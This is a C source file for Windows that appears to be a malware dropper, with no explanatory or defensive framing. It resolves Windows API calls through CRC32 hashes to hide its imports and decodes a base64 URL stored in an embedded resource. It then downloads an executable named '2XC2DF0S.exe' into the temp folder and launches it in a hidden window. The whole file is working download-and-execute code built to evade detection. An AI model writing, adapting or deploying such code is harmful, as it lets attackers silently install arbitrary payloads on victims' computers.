#include <stdio.h>
#include <Windows.h>

typedef BOOL(WINAPI *CryptStringToBinaryProto)(
	_In_    LPCTSTR pszString,
	_In_    DWORD   cchString,
	_In_    DWORD   dwFlags,
	_In_    BYTE    *pbBinary,
	_Inout_ DWORD   *pcbBinary,
	_Out_   DWORD   *pdwSkip,
	_Out_   DWORD   *pdwFlags
	);
typedef HRSRC(WINAPI* FindResourceAProto)(
	HMODULE hModule,
	LPCSTR  lpName,
	LPCSTR  lpType
	);

typedef HGLOBAL(WINAPI* LoadResourceProto)(
	_In_opt_ HMODULE hModule,
	_In_     HRSRC   hResInfo
	);

typedef LPVOID(WINAPI* LockResourceProto)(
	_In_ HGLOBAL hResData
	);

typedef DWORD(WINAPI* SizeofResourceProto)(
	_In_opt_ HMODULE hModule,
	_In_     HRSRC   hResInfo
	);

typedef HRESULT(WINAPI *URLDownloadToFileProto) (
	LPUNKNOWN            pCaller,
	LPCTSTR              szURL,
	LPCTSTR              szFileName,
	DWORD				 dwReserved,
	LPBINDSTATUSCALLBACK lpfnCB);

typedef DWORD(WINAPI* GetTempPathAProto)
(
	DWORD nBufferLength,
	LPSTR lpBuffer
	);

typedef BOOL(WINAPI* PathAppendAProto)
(
	LPSTR  pszPath,
	LPCSTR pszMore
	);

typedef HRESULT(WINAPI* URLDownloadToFileProto)
(
	LPUNKNOWN            pCaller,
	LPCTSTR              szURL,
	LPCTSTR              szFileName,
	DWORD                dwReserved,
	LPBINDSTATUSCALLBACK lpfnCB
	);

typedef BOOL(WINAPI* CreateProcessAProto)
(
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);



unsigned int crc32(unsigned char *message) {
	int i, crc;
	unsigned int byte, c;
	const unsigned int g0 = 0xEDB88320, g1 = g0 >> 1,
		g2 = g0 >> 2, g3 = g0 >> 3, g4 = g0 >> 4, g5 = g0 >> 5,
		g6 = (g0 >> 6) ^ g0, g7 = ((g0 >> 6) ^ g0) >> 1;

	i = 0;
	crc = 0xFFFFFFFF;
	while ((byte = message[i]) != 0) {    // Get next byte.
		crc = crc ^ byte;
		c = ((crc << 31 >> 31) & g7) ^ ((crc << 30 >> 31) & g6) ^
			((crc << 29 >> 31) & g5) ^ ((crc << 28 >> 31) & g4) ^
			((crc << 27 >> 31) & g3) ^ ((crc << 26 >> 31) & g2) ^
			((crc << 25 >> 31) & g1) ^ ((crc << 24 >> 31) & g0);
		crc = ((unsigned)crc >> 8) ^ c;
		i = i + 1;
	}
	return ~crc;
}


void *FakeGetProcAddress(HMODULE hModule, DWORD FuncName)
{
	IMAGE_NT_HEADERS *			ntHeaders;
	IMAGE_DOS_HEADER *			dosHeader;
	IMAGE_OPTIONAL_HEADER *		optionalHeader;
	IMAGE_DATA_DIRECTORY *		dataDirectory;
	IMAGE_EXPORT_DIRECTORY*		Exp;
	ULONG *						addressofnames;
	unsigned int				count = 1;
	char*						functionname;
	ULONG *						funcaddr;
	USHORT *					funcordnum;

	dosHeader = (IMAGE_DOS_HEADER *)hModule;

	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	ntHeaders = (IMAGE_NT_HEADERS *)(((BYTE *)dosHeader) + dosHeader->e_lfanew);

	if (ntHeaders->Signature != 0x00004550)
		return NULL;

	optionalHeader = &ntHeaders->OptionalHeader;
	dataDirectory = &optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	Exp = (IMAGE_EXPORT_DIRECTORY *)((DWORD)dosHeader + dataDirectory->VirtualAddress);
	addressofnames = (ULONG*)((BYTE*)hModule + Exp->AddressOfNames);
	funcaddr = (ULONG*)((BYTE*)hModule + Exp->AddressOfFunctions);
	for (count = 0; count < Exp->NumberOfNames; count++)
	{
		functionname = (char*)((BYTE*)hModule + addressofnames[count]);
		funcordnum = (USHORT*)((BYTE*)hModule + Exp->AddressOfNameOrdinals);
		if (crc32(functionname) == FuncName)
		{
			return (void*)((BYTE*)hModule + funcaddr[funcordnum[count]]);
		}
	}
	return NULL;
}

int DecodeBase64(LPCSTR pSrc, int nLenSrc, char* pDst, int nLenDst)
{
	DWORD nLenOut = nLenDst;

	CryptStringToBinaryProto fnCryptStringToBinary = (CryptStringToBinaryProto)FakeGetProcAddress(LoadLibraryA("crypt32.dll"), 0x224A2DC8);

	BOOL fRet = fnCryptStringToBinary(pSrc, nLenSrc, CRYPT_STRING_BASE64, (BYTE*)pDst, &nLenOut, NULL, NULL);

	return(nLenOut);
}

void myMemCpy(void *dest, void *src, size_t n)
{
	// Typecast src and dest addresses to (char *)
	char *csrc = (char *)src;
	char *cdest = (char *)dest;

	// Copy contents of src[] to dest[]
	for (int i = 0; i < n; i++)
		cdest[i] = csrc[i];
}

void* LoadThroughResource(LPCSTR resName, DWORD *dwSize)
{
	HRSRC	hRes;
	HGLOBAL rResLoaded;
	LPBYTE	lpBuff;
	LPVOID	lpImage = NULL;
	DWORD	dwImgSize = 0;

	FindResourceAProto pFindResourceA = (FindResourceAProto)FakeGetProcAddress(LoadLibraryA("kernel32.dll"), 0x3E006B7A);
	LoadResourceProto pLoadResource = (LoadResourceProto)FakeGetProcAddress(LoadLibraryA("kernel32.dll"), 0x92FFA82F);
	LockResourceProto pLockResource = (LockResourceProto)FakeGetProcAddress(LoadLibraryA("kernel32.dll"), 0x49B3B7C3);
	SizeofResourceProto pSizeofResource = (SizeofResourceProto)FakeGetProcAddress(LoadLibraryA("kernel32.dll"), 0xC319FA22);

	hRes = pFindResourceA(NULL, resName, MAKEINTRESOURCEA(10));
	if (hRes != NULL)
	{
		rResLoaded = pLoadResource(NULL, hRes);
		if (rResLoaded != NULL)
		{
			lpBuff = (LPBYTE)pLockResource(rResLoaded);
			if (lpBuff != NULL)
			{
				dwImgSize = pSizeofResource(NULL, hRes);
				if (dwImgSize != 0)
				{
					lpImage = VirtualAlloc(NULL, dwImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
					if (lpImage != NULL)
					{
						myMemCpy(lpImage, lpBuff, dwImgSize);
						*dwSize = dwImgSize;
						return lpImage;
					}
				}
			}
		}
	}
	return NULL;
}



size_t stringlength(const char *s) {
	size_t i = 0;
	while (s && *s != '\0') {
		s++;
		i++;
	}
	return i;
}


int Entry_Down()
{
	DWORD  dwSize = 0;
	LPCSTR szUrl = LoadThroughResource("FDP", &dwSize);
	char   pDest[256];
	char   szTemp[MAX_PATH];
	char   filename[] = "2XC2DF0S.exe";
	HRESULT hr;
	STARTUPINFOA si;
	PROCESS_INFORMATION psi;
	int sizeURL = 0;
	GetTempPathAProto pGetTempPathA = (GetTempPathAProto)FakeGetProcAddress(LoadLibrary("kernel32.dll"), 0xF3771641);
	PathAppendAProto pPathAppendA = (PathAppendAProto)FakeGetProcAddress(LoadLibrary("Shlwapi.dll"), 0xDD2A872C);
	URLDownloadToFileProto pURLDownloadToFile = (URLDownloadToFileProto)FakeGetProcAddress(LoadLibrary("Urlmon.dll"), 0x1E30F2EA);
	CreateProcessAProto pCreateProcessA = (CreateProcessAProto)FakeGetProcAddress(LoadLibrary("kernel32.dll"), 0xA851D916);

	sizeURL = DecodeBase64(szUrl, dwSize, pDest, sizeof(pDest));
	pDest[sizeURL] = '\0';
	RtlSecureZeroMemory(&psi, sizeof(psi));
	RtlSecureZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	pGetTempPathA(MAX_PATH, szTemp);
	pPathAppendA(szTemp, filename);
	hr = pURLDownloadToFile(NULL, pDest, szTemp, 0, NULL);

	if (SUCCEEDED(hr))
		pCreateProcessA(szTemp, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &psi);

	return 0;
}

